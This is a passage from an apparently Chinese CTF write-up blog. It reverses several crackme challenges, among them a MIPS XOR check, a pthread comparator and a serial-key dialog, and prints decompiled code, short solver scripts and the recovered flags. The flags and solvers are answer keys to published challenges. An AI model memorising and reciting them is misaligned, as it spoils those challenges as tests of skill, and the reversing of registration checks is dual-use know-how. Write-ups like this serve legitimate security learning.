<span class="hljs-comment">// 输入的flag倒序</span></span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v1 &lt; <span class="hljs-number">24</span> );</span><br><span class="line">    v4 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      byte_40336C[v4] = (byte_40336C[v4] + <span class="hljs-number">1</span>) ^ <span class="hljs-number">6</span>;</span><br><span class="line">      ++v4;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v4 &lt; <span class="hljs-number">24</span> );</span><br><span class="line">    v5 = <span class="hljs-built_in">strcmp</span>(byte_40336C, <span class="hljs-string">"xIrCj~&lt;r|2tWsv3PtI\x7Fzndka"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v5 )</span><br><span class="line">      v5 = -(v5 &lt; <span class="hljs-number">0</span>) | <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v5 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"right\n"</span>, v7);</span><br><span class="line">      <span class="hljs-built_in">system</span>(<span class="hljs-string">"pause"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target=<span class="hljs-string">'xIrCj~&lt;r|2tWsv3PtI\x7Fzndka'</span></span><br><span class="line">flag=<span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    flag+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">6</span>)-<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag[::-<span class="hljs-number">1</span>])</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{xNqU<span class="hljs-number">4</span>otPq<span class="hljs-number">3</span>ys<span class="hljs-number">9</span>wkDsN}</span><br></pre></td></tr></tbody></table></figure><h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h4><p>打开把所有的整数转换为字符就看到了flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">SECCON</span>{Welcome to the SECCON <span class="hljs-number">2014</span> CTF!}</span><br></pre></td></tr></tbody></table></figure><h4 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h4><p>这题是MIPS，IDA直接反编译不出来，MIPS指令学的也不是很好，所以直接用retdec插件</p><p>retdec直接反编译出来</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span> </span>{</span><br><span class="line">    <span class="hljs-comment">// 0x401398</span></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int32_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">31</span>; i++) {</span><br><span class="line">        <span class="hljs-keyword">char</span> v1 = *(<span class="hljs-keyword">char</span> *)(i + (<span class="hljs-keyword">int32_t</span>)<span class="hljs-string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span>); <span class="hljs-comment">// 0x4013d8</span></span><br><span class="line">        <span class="hljs-keyword">char</span> v2 = *(<span class="hljs-keyword">char</span> *)(*(<span class="hljs-keyword">int32_t</span> *)((<span class="hljs-keyword">int32_t</span>)argv + <span class="hljs-number">4</span>) + i); <span class="hljs-comment">// 0x4013f0</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int32_t</span>)v1 != ((<span class="hljs-keyword">int32_t</span>)v2 ^ <span class="hljs-number">55</span>)) {</span><br><span class="line">            <span class="hljs-comment">// 0x401408</span></span><br><span class="line">            <span class="hljs-built_in">print</span>();</span><br><span class="line">            <span class="hljs-built_in">exit_funct</span>();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// 0x401444</span></span><br><span class="line">    <span class="hljs-built_in">exit_funct</span>();</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以发现只有一个异或操作</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target=<span class="hljs-string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span></span><br><span class="line">flag=<span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    flag+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">55</span>))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">TUCTF</span><span class="hljs-template-variable">{but_really_whoisjohngalt}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h4><p>代码审计，直接给出了源码</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FLAG_LEN 20</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">checking</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> *result = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">char</span>));</span><br><span class="line">    <span class="hljs-keyword">char</span> *argument = (<span class="hljs-keyword">char</span> *)arg;</span><br><span class="line">    *result = (argument[<span class="hljs-number">0</span>]+argument[<span class="hljs-number">1</span>]) ^ argument[<span class="hljs-number">2</span>];</span><br><span class="line">    <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">highly_optimized_parallel_comparsion</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *user_string)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> initialization_number;</span><br><span class="line">    <span class="hljs-keyword">int</span> i;</span><br><span class="line">    <span class="hljs-keyword">char</span> generated_string[FLAG_LEN + <span class="hljs-number">1</span>];</span><br><span class="line">    generated_string[FLAG_LEN] = <span class="hljs-string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> ((initialization_number = <span class="hljs-built_in">random</span>()) &gt;= <span class="hljs-number">64</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">int</span> first_letter;</span><br><span class="line">    first_letter = (initialization_number % <span class="hljs-number">26</span>) + <span class="hljs-number">97</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">pthread_t</span> thread[FLAG_LEN];</span><br><span class="line">    <span class="hljs-keyword">char</span> differences[FLAG_LEN] = {<span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-4</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-7</span>};</span><br><span class="line">    <span class="hljs-keyword">char</span> *arguments[<span class="hljs-number">20</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) {</span><br><span class="line">        arguments[i] = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">3</span>*<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">char</span>));</span><br><span class="line">        arguments[i][<span class="hljs-number">0</span>] = first_letter;</span><br><span class="line">        arguments[i][<span class="hljs-number">1</span>] = differences[i];</span><br><span class="line">        arguments[i][<span class="hljs-number">2</span>] = user_string[i];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-built_in">pthread_create</span>((<span class="hljs-keyword">pthread_t</span>*)(thread+i), <span class="hljs-literal">NULL</span>, checking, arguments[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">void</span> *result;</span><br><span class="line">    <span class="hljs-keyword">int</span> just_a_string[FLAG_LEN] = {<span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">95</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">115</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) {</span><br><span class="line">        <span class="hljs-built_in">pthread_join</span>(*(thread+i), &amp;result);</span><br><span class="line">        generated_string[i] = *(<span class="hljs-keyword">char</span> *)result + just_a_string[i];</span><br><span class="line">        <span class="hljs-built_in">free</span>(result);</span><br><span class="line">        <span class="hljs-built_in">free</span>(arguments[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> is_ok = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (generated_string[i] != just_a_string[i])</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> *user_string = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">calloc</span>(FLAG_LEN+<span class="hljs-number">1</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">char</span>));</span><br><span class="line">    <span class="hljs-built_in">fgets</span>(user_string, FLAG_LEN+<span class="hljs-number">1</span>, stdin);</span><br><span class="line">    <span class="hljs-keyword">int</span> is_ok = <span class="hljs-built_in">highly_optimized_parallel_comparsion</span>(user_string);</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_ok)</span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"You win!\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Wrong!\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>源码比较长，但是做的事情不多，需要注意三个函数的用法</p><p>第一个是<code>pthread_create()</code>用来创建一个新的线程</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_create</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> *tidp,<span class="hljs-keyword">const</span> <span class="hljs-keyword">pthread_attr_t</span> *attr,(<span class="hljs-keyword">void</span>*)(*start_rtn)(<span class="hljs-keyword">void</span>*),<span class="hljs-keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用<code>checking()</code>函数，并把之前设定好的参数传给函数</p><p>第二个是<code>pthread_join()</code>用来传递返回结果</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_join</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> thread, <span class="hljs-keyword">void</span> **retval)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>所以result就是指向返回结果的指针，所以最终的目的就是让<code>checking()</code>函数返回的值为0</p><p>第三个是<code>random()</code>函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下<code>random()</code>和windows下<code>rand()</code>生成的数据并不一样</p><p>此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值</p><p>所以只需要根据<code>checking()</code>函数来逆向运算一下就可以得到结果了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FLAG_LEN 20</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> differences[FLAG_LEN] = {<span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-4</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-7</span>};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">int</span> first_letter;</span><br><span class="line">    first_letter = <span class="hljs-number">108</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">char</span> flag[FLAG_LEN];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) {</span><br><span class="line">        flag[i] = first_letter + differences[i];</span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">lucky_hacker_you_are</span></span><br></pre></td></tr></tbody></table></figure><h4 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h4><p>题目里面只有一个结构体，运行了一遍什么都没发现，OD调试的时候查找字符串找到flag</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">aliens_are_around_us</span></span><br></pre></td></tr></tbody></table></figure><h4 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h4><p>这题是个简单的注册机，找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DialogFunc</span><span class="hljs-params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  HMODULE v5; <span class="hljs-comment">// eax</span></span><br><span class="line">  HICON v6; <span class="hljs-comment">// eax</span></span><br><span class="line">  HMODULE v7; <span class="hljs-comment">// eax</span></span><br><span class="line">  HCURSOR v8; <span class="hljs-comment">// ST20_4</span></span><br><span class="line">  HWND v9; <span class="hljs-comment">// eax</span></span><br><span class="line">  CHAR String; <span class="hljs-comment">// [esp+8h] [ebp-340h]</span></span><br><span class="line">  CHAR v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+108h] [ebp-240h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [esp+10Ch] [ebp-23Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [esp+10Dh] [ebp-23Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [esp+10Eh] [ebp-23Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [esp+10Fh] [ebp-239h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [esp+110h] [ebp-238h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [esp+111h] [ebp-237h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [esp+112h] [ebp-236h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [esp+113h] [ebp-235h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [esp+114h] [ebp-234h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [esp+115h] [ebp-233h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [esp+116h] [ebp-232h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [esp+117h] [ebp-231h]</span></span><br><span class="line">  CHAR Text; <span class="hljs-comment">// [esp+208h] [ebp-140h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Src[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+308h] [ebp-40h]</span></span><br><span class="line">  __int128 v26; <span class="hljs-comment">// [esp+318h] [ebp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [esp+328h] [ebp-20h]</span></span><br><span class="line">  __int128 v28; <span class="hljs-comment">// [esp+32Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v29; <span class="hljs-comment">// [esp+33Ch] [ebp-Ch]</span></span><br><span class="line">  __int16 v30; <span class="hljs-comment">// [esp+340h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">16</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">EndDialog</span>(hDlg, <span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">272</span> )</span><br><span class="line">  {</span><br><span class="line">    v5 = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    v6 = <span class="hljs-built_in">LoadIconW</span>(v5, (LPCWSTR)<span class="hljs-number">0x67</span>);</span><br><span class="line">    <span class="hljs-built_in">SetClassLongA</span>(hDlg, <span class="hljs-number">-14</span>, (LONG)v6);</span><br><span class="line">    v7 = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    v8 = <span class="hljs-built_in">LoadCursorW</span>(v7, (LPCWSTR)<span class="hljs-number">0x66</span>);</span><br><span class="line">    v9 = <span class="hljs-built_in">GetDlgItem</span>(hDlg, <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-built_in">SetClassLongA</span>(v9, <span class="hljs-number">-12</span>, (LONG)v8);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">273</span> || (<span class="hljs-keyword">unsigned</span> __int16)a3 != <span class="hljs-number">1</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;String, (<span class="hljs-keyword">unsigned</span> __int16)a3 - <span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;Text, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>u);</span><br><span class="line">  <span class="hljs-built_in">GetDlgItemTextA</span>(hDlg, <span class="hljs-number">1001</span>, &amp;String, <span class="hljs-number">256</span>);</span><br><span class="line">  <span class="hljs-built_in">GetDlgItemTextA</span>(hDlg, <span class="hljs-number">1002</span>, v11, <span class="hljs-number">256</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(&amp;String, <span class="hljs-string">"@"</span>) &amp;&amp; <span class="hljs-built_in">strstr</span>(&amp;String, <span class="hljs-string">"."</span>) &amp;&amp; <span class="hljs-built_in">strstr</span>(&amp;String, <span class="hljs-string">"."</span>)[<span class="hljs-number">1</span>] &amp;&amp; <span class="hljs-built_in">strstr</span>(&amp;String, <span class="hljs-string">"@"</span>)[<span class="hljs-number">1</span>] != <span class="hljs-number">46</span> )</span><br><span class="line">  {</span><br><span class="line">    v28 = xmmword_410AA0;</span><br><span class="line">    v29 = <span class="hljs-number">1701999980</span>;</span><br><span class="line">    *(_OWORD *)Src = xmmword_410A90;</span><br><span class="line">    v30 = <span class="hljs-number">46</span>;</span><br><span class="line">    v26 = xmmword_410A80;</span><br><span class="line">    v27 = <span class="hljs-number">3830633</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v11) != <span class="hljs-number">16</span></span><br><span class="line">      || v11[<span class="hljs-number">0</span>] != <span class="hljs-number">67</span></span><br><span class="line">      || v23 != <span class="hljs-number">88</span></span><br><span class="line">      || v11[<span class="hljs-number">1</span>] != <span class="hljs-number">90</span></span><br><span class="line">      || v11[<span class="hljs-number">1</span>] + v22 != <span class="hljs-number">155</span></span><br><span class="line">      || v11[<span class="hljs-number">2</span>] != <span class="hljs-number">57</span></span><br><span class="line">      || v11[<span class="hljs-number">2</span>] + v21 != <span class="hljs-number">155</span></span><br><span class="line">      || v11[<span class="hljs-number">3</span>] != <span class="hljs-number">100</span></span><br><span class="line">      || v20 != <span class="hljs-number">55</span></span><br><span class="line">      || v12 != <span class="hljs-number">109</span></span><br><span class="line">      || v19 != <span class="hljs-number">71</span></span><br><span 